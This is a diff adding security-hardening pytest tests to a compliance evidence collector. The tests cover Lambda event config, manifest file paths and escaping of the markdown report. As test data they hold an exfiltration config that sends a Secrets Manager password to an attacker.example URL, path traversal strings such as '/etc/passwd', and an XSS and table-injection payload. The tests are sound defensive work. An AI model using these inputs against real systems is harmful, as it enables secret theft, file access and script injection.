@@ -546,3 +546,101 @@ def test_cli_catalog_commands(capsys):
         policy["Statement"][0]["Effect"] == "Allow"
         and "iam:*" not in policy["Statement"][0]["Action"]
     )
+
+
+# ------------------------------------------------- hardening: config, manifest, report
+def test_lambda_handler_ignores_no_event_config_but_rejects_an_event_supplied_one(
+    monkeypatch, tmp_path
+):
+    """Anyone who can invoke the function must not be able to swap in their own sinks/secrets."""
+    from grcevidence.lambda_handler import handler
+
+    good = {
+        "collectors": {"include": ["aws.kms_rotation"]},
+        "sinks": [{"type": "local", "path": str(tmp_path)}],
+    }
+    monkeypatch.setenv("GRC_CONFIG", json.dumps(good))
+    monkeypatch.delenv("GRC_ALLOW_EVENT_CONFIG", raising=False)
+
+    hostile = {
+        "collectors": {"include": ["aws.kms_rotation"]},
+        "sinks": [
+            {
+                "type": "http",
+                "url": "https://attacker.example/collect",
+                "auth": {"type": "bearer", "token": "secretsmanager:prod/db-password"},
+            }
+        ],
+    }
+    with pytest.raises(ConfigError, match="supplied its own config"):
+        handler({"config": hostile})
+    assert not list(tmp_path.iterdir())  # nothing collected or written
+
+
+def test_lambda_handler_event_config_can_be_explicitly_enabled(monkeypatch, tmp_path):
+    from grcevidence.lambda_handler import handler
+
+    monkeypatch.setenv("GRC_CONFIG", "{}")
+    monkeypatch.setenv("GRC_ALLOW_EVENT_CONFIG", "true")
+    cfg = {
+        "collectors": {"include": ["aws.kms_rotation"]},
+        "sinks": [{"type": "local", "path": str(tmp_path)}],
+    }
+    out = handler({"config": cfg})
+    assert list(out["sinks"].values()) == ["ok"]
+
+
+@pytest.mark.parametrize(
+    "bad",
+    ["../outside.json", "/etc/passwd", "sub/dir.json", "..\\outside.json", "manifest.json", ""],
+)
+def test_manifest_cannot_point_outside_its_run_directory(tmp_path, bad):
+    deliver(run(_config(), now=NOW), [LocalSink(tmp_path)])
+    run_dir = latest_run_dir(tmp_path)
+    outside = tmp_path / "outside.json"
+    outside.write_text("{}")
+
+    m = json.loads((run_dir / "manifest.json").read_text())
+    m["evidence"][0]["file"] = bad
+    (run_dir / "manifest.json").write_text(json.dumps(m))
+
+    problems = " ".join(verify_run(tmp_path))
+    assert "unsafe evidence file name" in problems
+    with pytest.raises(ValueError, match="unsafe evidence file name"):
+        load_run(tmp_path)
+
+
+def test_report_escapes_evidence_text_so_it_cannot_break_out_of_a_cell():
+    from grcevidence.catalog import controls_for
+    from grcevidence.models import Evidence, Finding, Severity
+
+    ev = Evidence(
+        collector="aws.iam_mfa",
+        provider="aws",
+        title="t",
+        account="123456789012",
+        region="global",
+        collected_at="2026-09-20T06:00:00+00:00",
+        status=Status.FAIL,
+        summary="s",
+        findings=[
+            Finding("a|b", "line1\n| injected | row |\n<img src=x onerror=alert(1)>", Severity.HIGH)
+        ],
+        controls=controls_for("aws.iam_mfa"),
+    ).seal()
+    manifest = RunManifest(
+        run_id="r|1",
+        started_at="2026-09-20T06:00:00+00:00",
+        finished_at="2026-09-20T06:00:01+00:00",
+        tool_version="0",
+        accounts=["<b>x</b>"],
+        counts={"fail": 1},
+        evidence=[],
+    ).seal()
+    md = report_markdown(manifest, [ev], "soc2")
+    assert "<img" not in md and "<b>" not in md
+    assert "&lt;img" in md
+    # every table row must still have the header's number of cells (no injected extra rows)
+    for line in md.splitlines():
+        if line.startswith("|"):
+            assert line.count("|") in (3, 6)  # summary table or control table, nothing else
